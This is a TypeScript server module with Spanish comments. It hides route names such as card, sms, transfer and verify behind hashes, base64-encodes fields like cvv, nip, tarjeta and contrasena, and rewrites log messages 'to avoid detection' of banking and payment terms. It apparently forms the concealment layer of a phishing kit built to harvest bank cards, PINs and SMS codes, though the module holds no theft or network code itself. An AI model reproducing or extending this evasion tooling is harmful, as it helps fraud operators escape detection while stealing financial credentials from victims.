// Módulo de protección del servidor
import crypto from 'crypto';

export class ServerProtection {
  private static instance: ServerProtection;
  private obfuscationKey: string;
  private routeMap: Map<string, string>;
  private sessionTokens: Map<string, string>;

  private constructor() {
    this.obfuscationKey = crypto.randomBytes(32).toString('hex');
    this.routeMap = new Map();
    this.sessionTokens = new Map();
    this.initializeRouteMappings();
  }

  public static getInstance(): ServerProtection {
    if (!ServerProtection.instance) {
      ServerProtection.instance = new ServerProtection();
    }
    return ServerProtection.instance;
  }

  private initializeRouteMappings() {
    // Mapear rutas sensibles a nombres ofuscados
    const routes = [
      'login', 'register', 'validate', 'session', 'user', 'admin', 
      'data', 'card', 'phone', 'code', 'email', 'sms', 'transfer',
      'cancel', 'protect', 'message', 'verify', 'process'
    ];

    routes.forEach(route => {
      this.routeMap.set(route, this.generateObfuscatedName(route));
    });
  }

  private generateObfuscatedName(input: string): string {
    const hash = crypto.createHash('sha256').update(input + this.obfuscationKey).digest('hex');
    return hash.substring(0, 8);
  }

  public obfuscateString(input: string): string {
    return Buffer.from(input).toString('base64');
  }

  public deobfuscateString(encoded: string): string {
    try {
      return Buffer.from(encoded, 'base64').toString('utf8');
    } catch {
      return encoded; // Return original if decoding fails
    }
  }

  public generateSecureToken(): string {
    return crypto.randomBytes(32).toString('hex');
  }

  public validateToken(token: string): boolean {
    return this.sessionTokens.has(token);
  }

  public createSession(userId: string): string {
    const token = this.generateSecureToken();
    this.sessionTokens.set(token, userId);
    return token;
  }

  public destroySession(token: string): void {
    this.sessionTokens.delete(token);
  }

  public obfuscateLogMessage(message: string): string {
    // Ofuscar mensajes de log para evitar detección
    const sensitiveTerms = [
      'password', 'card', 'credit', 'debit', 'account', 'balance',
      'transfer', 'payment', 'financial', 'bank', 'money', 'cash',
      'validation', 'verification', 'authenticate', 'authorize'
    ];

    let obfuscatedMessage = message;
    sensitiveTerms.forEach(term => {
      const regex = new RegExp(term, 'gi');
      obfuscatedMessage = obfuscatedMessage.replace(regex, this.obfuscateString(term));
    });

    return obfuscatedMessage;
  }

  public sanitizeRequest(req: any): any {
    // Sanitizar datos de request para logging
    const sanitized = { ...req };
    const sensitiveFields = [
      'password', 'contrasena', 'nip', 'cvv', 'card', 'tarjeta',
      'codigo', 'code', 'sms', 'token', 'session', 'auth'
    ];

    sensitiveFields.forEach(field => {
      if (sanitized[field]) {
        sanitized[field] = '[PROTECTED]';
      }
    });

    return sanitized;
  }

  public encryptSensitiveData(data: string): string {
    const cipher = crypto.createCipher('aes-256-cbc', this.obfuscationKey);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
  }

  public decryptSensitiveData(encryptedData: string): string {
    try {
      const decipher = crypto.createDecipher('aes-256-cbc', this.obfuscationKey);
      let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      return decrypted;
    } catch {
      return encryptedData; // Return original if decryption fails
    }
  }

  public generateObfuscatedFunction(functionName: string): string {
    const hash = crypto.createHash('md5').update(functionName + Date.now()).digest('hex');
    return `fn_${hash.substring(0, 8)}`;
  }

  public createSecureEndpoint(originalName: string): string {
    return this.routeMap.get(originalName) || this.generateObfuscatedName(originalName);
  }

  public validateSecureEndpoint(endpoint: string, originalName: string): boolean {
    return this.routeMap.get(originalName) === endpoint;
  }
}

// Funciones de utilidad exportadas
export const protectionUtils = {
  encode: (str: string): string => Buffer.from(str).toString('base64'),
  decode: (encoded: string): string => {
    try {
      return Buffer.from(encoded, 'base64').toString('utf8');
    } catch {
      return encoded;
    }
  },
  
  obfuscateArray: (arr: any[]): string => {
    return Buffer.from(JSON.stringify(arr)).toString('base64');
  },
  
  deobfuscateArray: (encoded: string): any[] => {
    try {
      return JSON.parse(Buffer.from(encoded, 'base64').toString('utf8'));
    } catch {
      return [];
    }
  },

  createHash: (input: string): string => {
    return crypto.createHash('sha256').update(input).digest('hex');
  },

  verifyHash: (input: string, hash: string): boolean => {
    return crypto.createHash('sha256').update(input).digest('hex') === hash;
  }
};

// Constantes ofuscadas para el servidor
export const serverConstants = {
  SENSITIVE_ROUTES: [
    protectionUtils.encode('login'),
    protectionUtils.encode('register'),
    protectionUtils.encode('validate'),
    protectionUtils.encode('session'),
    protectionUtils.encode('admin'),
    protectionUtils.encode('user'),
    protectionUtils.encode('data'),
    protectionUtils.encode('process')
  ],
  
  PROTECTED_FIELDS: [
    protectionUtils.encode('password'),
    protectionUtils.encode('contrasena'),
    protectionUtils.encode('nip'),
    protectionUtils.encode('cvv'),
    protectionUtils.encode('card'),
    protectionUtils.encode('tarjeta'),
    protectionUtils.encode('codigo'),
    protectionUtils.encode('code'),
    protectionUtils.encode('sms'),
    protectionUtils.encode('token'),
    protectionUtils.encode('session'),
    protectionUtils.encode('auth')
  ],

  ERROR_MESSAGES: {
    INVALID_REQUEST: protectionUtils.encode('Invalid request'),
    UNAUTHORIZED: protectionUtils.encode('Unauthorized access'),
    VALIDATION_FAILED: protectionUtils.encode('Validation failed'),
    SESSION_EXPIRED: protectionUtils.encode('Session expired'),
    SECURITY_VIOLATION: protectionUtils.encode('Security violation detected'),
    RATE_LIMIT_EXCEEDED: protectionUtils.encode('Rate limit exceeded')
  }
};

export default ServerProtection;